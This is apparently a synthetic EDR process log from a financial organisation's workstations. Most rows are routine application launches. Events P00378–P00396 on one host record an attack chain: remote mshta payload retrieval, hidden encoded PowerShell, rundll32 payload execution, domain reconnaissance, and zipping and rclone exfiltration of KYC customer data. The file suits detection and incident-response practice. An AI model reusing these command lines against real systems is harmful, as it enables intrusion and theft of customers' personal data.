event_id,timestamp,asset_id,user_id,parent_process,process_name,command_line,sha256,signature_status,edr_action,risk_level
P00315,2026-09-11 06:18:52,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8f856a45c3ade7352213a38c601e16bd9b0248748a328c8b9bcc54eb8af141e4,signed,ALLOWED,Low
P00316,2026-09-11 06:22:31,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d9d9386c9bd6dfb850167a8685c5e159da99aa4be28ac0de36af1885b444c15c,signed,ALLOWED,Low
P00317,2026-09-11 06:23:15,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",6597f6fd8d60fda8aa93114536661eefa6dae0f570ca6af7958ba22a31ede619,signed,ALLOWED,Low
P00318,2026-09-11 06:26:47,WKST-LOAN-018,shilongo,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2173a6d6a446da4daf362ef5d8b5b86c6f749a4f2becea392c883eacbf01d12f,signed,ALLOWED,Low
P00319,2026-09-11 06:30:05,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1849fcf49c716cefce672da5e6d41bab60842c50802b0902181bc29956a3b621,signed,ALLOWED,Low
P00320,2026-09-11 06:34:48,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",964a8fec91b1e1675667be767e5f47d8c8b673bf78d96b30a276003eab4290a4,signed,ALLOWED,Low
P00321,2026-09-11 07:00:10,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,54462c0937ef5dfa9b88ee900fcb78274eb18c1af93af73cbab6603e89a38514,signed,ALLOWED,Low
P00322,2026-09-11 07:03:50,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f4f223f04d5bcfd3ca21f5b64c26bfae3faeaa9688db511597bd84d8b77d4069,signed,ALLOWED,Low
P00323,2026-09-11 07:18:54,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",92d1b5cc7db345b2c5ca6ea85315caecef6e4d5300a5b9c7dba07514845d5e58,signed,ALLOWED,Low
P00324,2026-09-11 07:20:26,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",b2da5ff32bac3d809d7db0abbc8b40bda0a30055a56204f4ec009a2a72d8bff7,signed,ALLOWED,Low
P00325,2026-09-11 07:30:21,WKST-PRC-008,sankwasa,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",1265aa5066058011400820188ec17f4b3b6488df8759df5de0a8c3a48ada6f12,signed,ALLOWED,Low
P00326,2026-09-11 07:32:39,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b09abfa2489b4ef6f8465ed6931b04593ddf4204685ce5249bcd63895d19cf9f,signed,ALLOWED,Low
P00327,2026-09-11 07:36:23,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",03150ee9b8ec34946d48bd098aa70f405df1d323559ef5e066bfe15335b4153b,signed,ALLOWED,Low
P00328,2026-09-11 07:45:48,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",14447e1939f4f4033049667449c6b4525063b9d73066c83779e161804401421c,signed,ALLOWED,Low
P00329,2026-09-11 08:15:04,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c2328a09d5e7c3e61bfeab2a4c62db4c6fa6102c6abcce63e85b9a49aacf3d95,signed,ALLOWED,Low
P00330,2026-09-11 08:29:05,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7a495d697cea6232c0a860792078d8245e5a4686cac6d98f8ec8e31f21149436,signed,ALLOWED,Low
P00331,2026-09-11 08:30:53,WKST-MKT-010,ntinda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",35a2362517d4f6036aba6ed438ba91e257bf664c046eaab573fa649500957022,signed,ALLOWED,Low
P00332,2026-09-11 08:57:03,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1ce7fb5378d13552252e9a36904b5251907413d73ff8cdac25430bf54285bcba,signed,ALLOWED,Low
P00333,2026-09-11 09:12:06,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a1ea31d137a4921c8d479d299d3c1dd9f50dea1a43ddc00db45a6ef31f9985a3,signed,ALLOWED,Low
P00334,2026-09-11 09:15:39,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,aef6ffab3f52159a6c518e913d13a27519fc6718c8fac1ad605caa5fad3eb3b1,signed,ALLOWED,Low
P00335,2026-09-11 09:19:58,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",034979231579567eeef5f35fa72a9f559c74a15de178fc0d365ee00a259652d1,signed,ALLOWED,Low
P00336,2026-09-11 09:20:53,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c4632e25d184896931f054839583665714191bb37acb3d3a85dbc21887e99f0b,signed,ALLOWED,Low
P00337,2026-09-11 09:28:31,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ac2daf85e2115f225b0b8ab3c67910ae88b4ca3057178f79eb6db4ee775a7ccf,signed,ALLOWED,Low
P00338,2026-09-11 09:59:25,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",b459da8d19fd06b1588edd812cacaa59ef4b12ef5bbe626e6c29c718a5261264,signed,ALLOWED,Low
P00339,2026-09-11 10:01:26,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d15e432c855cb0f07b718adf5563f786cae82062abd2426a16c967031c941831,signed,ALLOWED,Low
P00340,2026-09-11 10:06:50,WKST-LOAN-018,shilongo,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1a55b44a4403ec7462564d8f87bf8d9bcb8f33d0794939c7ee360fabfa181ae0,signed,ALLOWED,Low
P00341,2026-09-11 10:10:57,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",073eed99cb919723d9c868855d5fb5fa82604fc1cfa3427984127ac1f1ff5a45,signed,ALLOWED,Low
P00342,2026-09-11 10:37:31,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3f8707bf17e4beb676a8687105c8037db878739b909d9b2bff3c46898dac5d8a,signed,ALLOWED,Low
P00343,2026-09-11 10:46:59,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",230a5f90bf71556c0145a2dd3b1d3c6768184a42430bce89fd3bebfb74fac65c,signed,ALLOWED,Low
P00344,2026-09-11 10:58:21,WKST-CS-011,tkamati,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",6721d67b70f95a997017c8057c4440be63401f3c9a1f929e30d91182296527f0,signed,ALLOWED,Low
P00345,2026-09-11 11:17:58,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",1d71ea313a2d74c6b3c5dbecbad2bbaef2c347031d7824dcbcf9710018a14bd8,signed,ALLOWED,Low
P00346,2026-09-11 11:31:16,WKST-TRY-007,hamukwaya,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f615cbb4e16861673ae9f5194600bf107c5c3d4cfde937868cc01914735885da,signed,ALLOWED,Low
P00347,2026-09-11 11:32:19,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",bccf5c76715b916bacfa3175e86be7eca6aa5ef83ff927b30e462df2804d3bb9,signed,ALLOWED,Low
P00348,2026-09-11 11:42:46,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,8fe2b86ca9b028b26895715479f47d0ecc1e8f4be4a38e1f3a75a0549115c3dd,signed,ALLOWED,Low
P00349,2026-09-11 11:45:45,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",427df85b707f74aa4e9609eda6a4ef0e2a57e10d3136202016daf7321ba99033,signed,ALLOWED,Low
P00350,2026-09-11 11:49:40,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",68c03b8a52567d9c3eef8a532de64773aa5005cd640142edda7d7aba3a1f2659,signed,ALLOWED,Low
P00351,2026-09-11 11:59:09,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",bb9f38a965e50e36759b249955e887932a6a132e4e8c45951e74666756cbdeee,signed,ALLOWED,Low
P00352,2026-09-11 12:03:26,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c3fbd8b349af87c0a4e9bae1675b7b9b30e7c8362808d07fd0345f0b4c4b4ab0,signed,ALLOWED,Low
P00353,2026-09-11 12:06:14,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b7902709b0c63ea4609fd9511ea6d75986cbd96ae09047224603f069f97c3ba1,signed,ALLOWED,Low
P00354,2026-09-11 12:19:11,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",869c4847582794588bd8a33ce630181c661ad6db0a79e13625dd18f7aa21abe2,signed,ALLOWED,Low
P00355,2026-09-11 12:22:01,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c075e024d9729a2bb7ba636d509ccb7539c7333550d2b5aa29f6438ec488f4af,signed,ALLOWED,Low
P00356,2026-09-11 12:48:57,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",67cc0965f6161979d1ccc1867b91284a2bdd29c0d9bf0d5add4f88d1d7d6d674,signed,ALLOWED,Low
P00357,2026-09-11 12:52:48,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cf2cba6e7b734e5854a67964c94e33179476348a2c813a348d9e6e004742d9a6,signed,ALLOWED,Low
P00358,2026-09-11 12:53:45,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3877356a55148864a73bc3dd2e044513916fea7dd9d25fd80feeffc3bda2896f,signed,ALLOWED,Low
P00359,2026-09-11 13:24:45,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f94c09ceb94c1d3945f6a0721f945781894b68f1fdb8c0631a034326214950f9,signed,ALLOWED,Low
P00360,2026-09-11 13:30:57,WKST-LOAN-018,shilongo,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",fe68b58ea827333e2a32d030d6999d25bf6d919704549b990cb100dc1e35942a,signed,ALLOWED,Low
P00361,2026-09-11 13:41:55,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",84fd9811dc3c531e34a882e2595814d32f7a740050e25a850d8140e30f57fe12,signed,ALLOWED,Low
P00362,2026-09-11 13:48:01,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,12c0db4583924b5c8d73c173287fe485896606a05eb92158342936e777f8fc93,signed,ALLOWED,Low
P00363,2026-09-11 14:25:34,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",b56b2fc035ae84870bf9bce5401e5e2a80b8b6b87a91ad7d130afd38b12cd520,signed,ALLOWED,Low
P00364,2026-09-11 14:31:21,WKST-SOC-003,haufiku,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",00acccffed7fe07866357a88f1eff6ce0f820ab62b430ba744435b890a63ba07,signed,ALLOWED,Low
P00365,2026-09-11 14:40:11,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",5508956c1bd013ff1f8191ec823d4716ef62c680653dafdc99cf706ca075f06d,signed,ALLOWED,Low
P00366,2026-09-11 14:43:00,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",338dc0a01099a41ee6dec882d261ebd689b21af7f52a89a91408b5a7ced5f72e,signed,ALLOWED,Low
P00367,2026-09-11 14:48:59,WKST-FIN-004,tshivute,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",1ca612cf26ec940b2ef02e3fba4f0bf0cc465ab3b39afb39ee6977f080e47f0c,signed,ALLOWED,Low
P00368,2026-09-11 15:06:23,WKST-OND-004,ndjaba,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f5ce8b26b5e62397770d0271dc26ec12b6f7f9e4edc265504086b4f8cdb918ec,signed,ALLOWED,Low
P00369,2026-09-11 15:13:10,WKST-CMP-009,kndjavera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",715103b67977b474958c16d03dc7dd0c9a39991946ed096aed70182117acb529,signed,ALLOWED,Low
P00370,2026-09-11 15:18:14,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6c4a270e7b59293adf0f5ead5bd53ff6a16d99a7cabf8c60f805d40f5935ecc0,signed,ALLOWED,Low
P00371,2026-09-11 15:25:10,WKST-SWK-002,nduminga,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",a302ec2425d7118b551809ef8f85c4448daab4abfe9eef50243505f6495c612b,signed,ALLOWED,Low
P00372,2026-09-11 15:35:04,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,6a89fe1d13cce5cd995f6c95b077e9df1d6d9dea05d984ef9992db2b281b8609,signed,ALLOWED,Low
P00373,2026-09-11 15:38:01,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",90d12b1c4df32dd4e626b297cef1622726b2ea3fe01f9e1cd4689b113aae5419,signed,ALLOWED,Low
P00374,2026-09-11 15:47:13,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",be6a51cbdb76d05c344c0762583add370f8bd9c557a9a619455e0bba0c4c9988,signed,ALLOWED,Low
P00375,2026-09-11 16:53:34,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,02b4d4ea72f55b3d7ebd09217cd844b6e0c0787e99e6002521d7d8cacd457849,signed,ALLOWED,Low
P00376,2026-09-11 16:55:01,WKST-PRC-008,sankwasa,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",583e24e3c6f1be4516ba1b701f2d08459029092cdfbc41ed44c5bbbcc9eb88e7,signed,ALLOWED,Low
P00377,2026-09-11 17:01:19,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",0d2b1360bbfc56f7c0b08dd31077d5841f8c459ab4ddf5b525574c3304be4fed,signed,ALLOWED,Low
P00378,2026-09-11 17:02:07,WKST-CS-017,mhaingura,outlook.exe,chrome.exe,chrome.exe https://ofservices-portal.com/benefits-review,9390ef32addf32bfdea786bc1e20679592498068bcbfcd357ea10ab64ea35e47,signed,ALLOWED,Medium
P00379,2026-09-11 17:03:19,WKST-CS-017,mhaingura,chrome.exe,mshta.exe,mshta.exe https://ofservices-portal.com/assets/update.hta,37ed5aea92bb7c32618ef6810a3967d36006f6ef420621cea199c2edd479edda,unsigned,ALLOWED,High
P00380,2026-09-11 17:03:44,WKST-CS-017,mhaingura,mshta.exe,powershell.exe,powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA,37ed5aea92bb7c32618ef6810a3967d36006f6ef420621cea199c2edd479edda,unsigned,ALLOWED,Critical
P00381,2026-09-11 17:04:12,WKST-CS-017,mhaingura,powershell.exe,rundll32.exe,"rundll32.exe C:\Users\Public\wupdate.dat,Start",37ed5aea92bb7c32618ef6810a3967d36006f6ef420621cea199c2edd479edda,unsigned,ALLOWED,Critical
P00382,2026-09-11 17:05:45,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",96284767bea27060e539fd156ffbeb6f9eef80832cdd4cb65b335a6a26bc09e1,signed,ALLOWED,Low
P00383,2026-09-11 17:24:43,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7690cd593eff8b0d6b3659b59eedb248898764dd7c146aa54fc4e370e88de243,signed,ALLOWED,Low
P00384,2026-09-11 17:30:46,WKST-HR-014,mukwambi,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f84de0854f1dfb1514ff4bfc887593eafbb97b3c51c8ca53069a43447f824987,signed,ALLOWED,Low
P00385,2026-09-11 18:05:54,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e0aeecbb5505979c1763a5a03fc14a80127506d9c2b00b802cd8d63580a6c78b,signed,ALLOWED,Low
P00386,2026-09-11 18:10:39,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",1cd2ff066ab56d820accbb2f756176ad29b03c6199c2fe322597634b88e6511a,signed,ALLOWED,Low
P00387,2026-09-11 18:10:59,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d97b6f7d76d63670ad1c1afa74a89c770699d74cd2a86d355a9226be2f3cecde,signed,ALLOWED,Low
P00388,2026-09-11 18:25:33,WKST-CS-017,mhaingura,powershell.exe,net.exe,"net.exe group ""Domain Admins"" /domain",a08a0fcbdeafd3c1b3a4b495b9a9c9d96850f08946b52bc0622347d3b6e73b78,signed,ALLOWED,High
P00389,2026-09-11 18:26:09,WKST-CS-017,mhaingura,powershell.exe,nltest.exe,nltest.exe /dclist:ofs.local,aa88b9a477164a994d1a75ae07a88fe49298afb96f2216307ef32219e35271d8,signed,ALLOWED,High
P00390,2026-09-11 18:29:02,WKST-AUD-004,tjirera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2dc5363c032ab95307383cbd0e34395f69e31d27ecc8663c5245285872849b98,signed,ALLOWED,Low
P00391,2026-09-11 18:38:24,WKST-CMP-003,amupanda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2b27f1d6ed751c6894adbe521f2a68bcfc14c040531f0357fe196d792d11c359,signed,ALLOWED,Low
P00392,2026-09-11 18:42:28,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",4a9c7444ff90327821d1cc1e2784eec140bbc220cf5553af0edadaeacfa0b5a6,signed,ALLOWED,Low
P00393,2026-09-11 18:48:22,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,890e0f220700bd9e8829befe3f9519240296d64745fd739270349a6069d4936e,signed,ALLOWED,Low
P00394,2026-09-11 19:51:52,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,815d4eb6bce4713bf2e4d15626c2167755dcfcb06154c840160074ae26a43934,signed,ALLOWED,Low
P00395,2026-09-12 00:26:16,WKST-CS-017,mhaingura,powershell.exe,7z.exe,7z.exe a -tzip C:\Users\Public\kyc_q3.zip \FS-KYC-01\Exports\2026-Q3\*,98fa304eb3568381f00496a72c88f03254035e878aa5bcb6129534dce482e03d,signed,ALLOWED,Critical
P00396,2026-09-12 00:35:44,WKST-CS-017,mhaingura,powershell.exe,rclone.exe,rclone.exe copy C:\Users\Public\kyc_q3.zip remote:ofs-sync --transfers 4,d20d4b5e7f2ab15d675ecaa9df391bc6d8a43d352ffb9fd0916c1a3e5fce8361,unsigned,ALLOWED,Critical
P00397,2026-09-12 06:02:02,WKST-RSK-006,murorua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ddafa929f54ee4406b8e1ee59e7447770aca6ebabc6ad68ceb927ef22a5d4eea,signed,ALLOWED,Low
P00398,2026-09-12 06:25:04,WKST-CS-011,tkamati,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c02bded06debc2c043ab16031e09ff8d1f58e1c51afd0560b2c6a2d956a2e293,signed,ALLOWED,Low
P00399,2026-09-12 06:50:50,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",7d8241a5e042d6ce6bbf9c717b0a51b005168830c4d93423d40eb6f205d59957,signed,ALLOWED,Low
P00400,2026-09-12 07:07:17,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",e87d5b78aae8074e83a439d75a562fcbabb1698128ec8b26ff8d6b5ba1ce12b3,signed,ALLOWED,Low
P00401,2026-09-12 07:11:09,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",39d0f9b35cb797603db3939022961b0baab1cc02a6e141e2f41cc0bf8cae4ac8,signed,ALLOWED,Low
P00402,2026-09-12 07:14:56,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",fdc4c81218f606300c0df9468c11ad44460c16296c763fa15e61a9a4231c23a3,signed,ALLOWED,Low
P00403,2026-09-12 07:32:18,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",bc4f73bac60d620ce3e6cbd48101bf7ba0a7181de6995f8020edd582655f5477,signed,ALLOWED,Low
P00404,2026-09-12 07:38:24,WKST-CS-006,nnakale,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",bac9f11eb68f5d31a00e53f641dcec0e214a3e18e1245e4cd1ec50cf02c8dfcc,signed,ALLOWED,Low
P00405,2026-09-12 07:40:19,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,65079f8ac79a3b3b8e0e0ac01a131605a53b8602c1910b790d408589ddf18750,signed,ALLOWED,Low
P00406,2026-09-12 07:57:33,WKST-MKT-010,ntinda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4ae801f90d569bdaec38124063d7f7d22292292e3a4138eca25d0c4232d3d45f,signed,ALLOWED,Low
P00407,2026-09-12 08:16:10,WKST-FIN-021,jkavari,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d57510482607412c903d52b0f500de332d154bd00cea07f8466a15e055fd5d61,signed,ALLOWED,Low
P00408,2026-09-12 08:17:52,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",01cf4f5455930010e7a7c269ce5dfc7741835abb160006b5b395de696b4cac17,signed,ALLOWED,Low
P00409,2026-09-12 08:32:19,WKST-CS-011,tkamati,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",19f823608ba753462d029004beb64a65a2f6cd93d673a974705b67e09b9db7e2,signed,ALLOWED,Low
P00410,2026-09-12 08:35:48,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",9df86e228e4462a863740856e64b4a2be8ee19888137b6542155944be12a068a,signed,ALLOWED,Low
P00411,2026-09-12 09:00:07,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",4d61954f1aa7eff91d8d87cbb95085acd924fcb90e3030771517c8697334a649,signed,ALLOWED,Low
P00412,2026-09-12 09:02:30,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d17b167f96bc02fdfa6386788238848df3f3de6af6086136795e0552446d44c4,signed,ALLOWED,Low
P00413,2026-09-12 09:05:45,WKST-LGL-005,mbandeka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3f0b5b6f4ddf7adedc79550c8fa5a7176bcbd16b10cabf707de8a3c8d781264a,signed,ALLOWED,Low
P00414,2026-09-12 09:32:15,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,4c1943f5aa84e844ff265989b9fa643e4c10b396fb17fd5da615691038fd6804,signed,ALLOWED,Low
P00415,2026-09-12 09:34:08,WKST-TRY-007,hamukwaya,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",4dbe739745c72b17b829765389bde6ac625e0b00d0f456177d064f0046d5c092,signed,ALLOWED,Low
P00416,2026-09-12 09:35:31,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2f063c460e8d043519e5a5f9aa9e301fc074a81b9d1b2685e4dafea250eddf59,signed,ALLOWED,Low
P00417,2026-09-12 09:41:32,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",945b0850b4b5ce28f532c1e3192f254436bd66a0ab93fe3c796da21f82c51054,signed,ALLOWED,Low
P00418,2026-09-12 09:43:08,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f3a8f9feeffd9281efd34c643ac8c6f2f4ce230cf416b90b8bc01105175439ad,signed,ALLOWED,Low
P00419,2026-09-12 09:48:13,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",45e4c6375d76f4e77aa6df653f8e4a2a4ad67264fe92afeecbde2ba8ec7db96c,signed,ALLOWED,Low
